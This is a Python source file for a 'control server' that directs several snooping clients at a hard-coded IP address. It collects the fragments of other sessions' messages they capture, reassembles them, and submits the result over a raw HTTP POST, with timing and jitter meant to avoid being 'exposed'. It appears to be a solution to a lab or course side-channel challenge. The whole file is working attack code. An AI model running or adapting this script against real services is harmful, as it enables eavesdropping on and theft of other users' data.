# Control Server for Snooping Clients

import random
import socket
import sys
from select import select
from typing import List, Set

from MessageReconstructor import MessageReconstructor
from Server import Server, SnoopedPacket

SNOOP_SERVER_IP = "149.171.36.192"
SNOOP_SERVER_PORT = 8154
HTTP_SERVER_PORT = 8155

def main() -> None:
    with Server() as server:
        # Connect and configure the clients
        client_count = 1 if len(sys.argv) < 2 else int(sys.argv[1])
        bitrate = 1000 if len(sys.argv) < 3 else int(sys.argv[2])

        server.connect_clients(client_count)
        server.config_clients(ip=SNOOP_SERVER_IP, port=SNOOP_SERVER_PORT)

        message_reconstructor: MessageReconstructor = MessageReconstructor()
        timeout_count: int = 0
        ident: int = 0
        timeout: float = 60/bitrate
        
        while True:
            # Select on one of the clients returning data
            readable, _, exceptions = select(server.connections, [], server.connections, timeout)
            conn: socket.socket

            # If we timeout that means no more transmissions from the clients
            # And we are ready to send a new set of messages without being exposed
            if len(readable) == len(exceptions) == 0:
                timeout_count += 1
                if timeout_count == 1:
                    message = message_reconstructor.reconstruct_message()
                    if message:
                        # Send the message to the server
                        if (send_message(message)):
                            # Message accepted, reset the loop and continue
                            print("Message accepted by server")
                            message_reconstructor = MessageReconstructor()
                            continue

                    # Add jitter into the timeout to make sure we dont just loop over the same messages
                    timeout = (60 + random.randrange(0, 100))/bitrate

                    # Send snoop requests to all clients
                    # Make sure we send requests with offset queue positions
                    for n in range(client_count):
                        server.send_snoop_req(n, 1 + n, ident)
                        ident += 1

                # If we timeout 20 times (20 * 50 char = 1000 char, which is time to lengthen queue)
                # resend requests and try again
                elif timeout_count >= 25:
                    print(f"Timeout - retrying")
                    for n in range(client_count):
                        server.send_snoop_req(n, 1 + 2*n, ident)
                        ident += 1
                    timeout_count = 0

            for conn in exceptions:
                print(f"Something has gone wrong with client {server.connections.index(conn)}")
                exit()

            for conn in readable:
                timeout_count = 0
                try:
                    for packet in server.get_snooped_packet(conn):
                        print(f"Got {packet.request_ident};{packet.packet_ident};{packet.message}")
                        message_reconstructor.add_packet(packet)
                except ConnectionAbortedError:
                    print(f"Client {server.connections.index(conn)} closed connection")
                    exit()

# Send complete message to server
# Return true if accepted, exit if all messages sent successfully
def send_message(message: str) -> bool:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    
    s.connect((SNOOP_SERVER_IP,HTTP_SERVER_PORT))
    
    header = "POST /session HTTP/1.1\r\n"
    host = "Host: " + SNOOP_SERVER_IP + ":8155\r\n"
    contentLength = "Content-Length: " + str(len(message)) + "\r\n\r\n"

    data = header + host + contentLength + message
    s.sendall(str.encode(data))

    rec = s.recv(4096)

    if "200" in rec.decode():
        return True
    elif "205" in rec.decode():
        exit()
    else:
        return False

main()
